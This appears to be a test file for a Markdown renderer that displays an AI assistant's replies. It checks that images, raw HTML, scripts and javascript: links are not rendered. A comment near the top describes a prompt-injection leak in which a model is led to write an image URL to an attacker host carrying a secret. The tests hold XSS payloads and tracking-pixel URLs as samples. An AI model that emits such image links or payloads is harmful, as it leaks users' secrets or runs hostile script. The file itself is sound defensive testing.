import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import { Markdown } from './Markdown'

/**
 * 助理回覆的 markdown（M5 票 12）。圖片網址是常見的外洩通道（brief §14、研究 C4 第 6 點）：
 * 模型被外部內容誘導寫出 `![](https://attacker/?q=<秘密>)`，瀏覽器一載入就送出去了。
 */
describe('Markdown', () => {
  it('does not load an image the reply points at', () => {
    const { container } = render(
      <Markdown text={'看這張：\n\n![追蹤用的圖](https://tracker.example/pixel.png?q=secret)'} />,
    )

    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('[src]')).toBeNull()
    expect(container.querySelector('[srcset]')).toBeNull()
    // 說出那裡本來有一張圖、它在哪裡——原文照印，不是連結。
    expect(screen.getByText('圖片沒有載入')).toBeInTheDocument()
    expect(screen.getByText('追蹤用的圖')).toBeInTheDocument()
    const url = screen.getByText('https://tracker.example/pixel.png?q=secret')
    expect(url.closest('a')).toBeNull()
  })

  it('does not load an image written as a reference either', () => {
    const { container } = render(
      <Markdown text={'![圖][p]\n\n[p]: https://tracker.example/ref.png'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByText('https://tracker.example/ref.png')).toBeInTheDocument()
  })

  it('does not render raw HTML, so an <img> tag cannot sneak an image in', () => {
    const { container } = render(
      <Markdown
        text={
          '<img src="https://tracker.example/raw.png" onerror="alert(1)">\n\n<script>alert(1)</script>'
        }
      />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
  })

  it('drops a javascript: link but keeps an ordinary one, opened away from Berth', () => {
    render(
      <Markdown text={'[壞](javascript:alert(1)) 與 [好](https://www.themoviedb.org/tv/120089)'} />,
    )

    expect(screen.getByText('壞').closest('a')?.getAttribute('href') ?? '').not.toMatch(
      /javascript/i,
    )
    const good = screen.getByRole('link', { name: '好' })
    expect(good).toHaveAttribute('href', 'https://www.themoviedb.org/tv/120089')
    expect(good).toHaveAttribute('target', '_blank')
    expect(good).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('renders the usual reply: emphasis, lists, code and a table', () => {
    const { container } = render(
      <Markdown
        text={
          '**SPY×FAMILY**：停在審核（結論 `awaiting_review`）。\n\n- S01E01：審核\n- S01E25：在路上\n\n| 集 | 結論 |\n| --- | --- |\n| E01 | awaiting_review |'
        }
      />,
    )
    expect(screen.getByText('SPY×FAMILY').tagName).toBe('STRONG')
    expect(screen.getAllByRole('listitem')).toHaveLength(2)
    expect(screen.getAllByText('awaiting_review')[0].tagName).toBe('CODE')
    expect(container.querySelector('table')).not.toBeNull()
  })
  it('keeps only the elements the panel draws: a task list loses its checkbox, not its text', () => {
    const { container } = render(<Markdown text={'- [x] 已入庫\n- [ ] 等審核'} />)
    expect(container.querySelector('input')).toBeNull()
    expect(screen.getByText('已入庫')).toBeInTheDocument()
  })

  it('ends a bare address at the Chinese text right after it', () => {
    // 實跑抓到的（票 22 critique）：GFM 的自動連結只認空白，把「，但」吃進網址。
    render(<Markdown text={'網址是 https://mikanani.me/RSS/Bangumi?bangumiId=3310，但我沒加。'} />)

    const link = screen.getByRole('link', {
      name: 'https://mikanani.me/RSS/Bangumi?bangumiId=3310',
    })
    expect(link).toHaveAttribute('href', 'https://mikanani.me/RSS/Bangumi?bangumiId=3310')
    expect(link.parentElement).toHaveTextContent(
      '網址是 https://mikanani.me/RSS/Bangumi?bangumiId=3310，但我沒加。',
    )
  })

  it('leaves a written link and its own text alone', () => {
    render(<Markdown text={'[Mikan 的頁面](https://mikanani.me/Home/Bangumi/3310)。'} />)

    expect(screen.getByRole('link', { name: 'Mikan 的頁面' })).toHaveAttribute(
      'href',
      'https://mikanani.me/Home/Bangumi/3310',
    )
  })

  it('draws a link in a sentence as part of the sentence, not as a label', () => {
    render(<Markdown text={'看 https://example.org/a 這裡'} />)

    const link = screen.getByRole('link')
    expect(link).not.toHaveClass('label')
    expect(link).not.toHaveClass('inline-flex')
  })
})
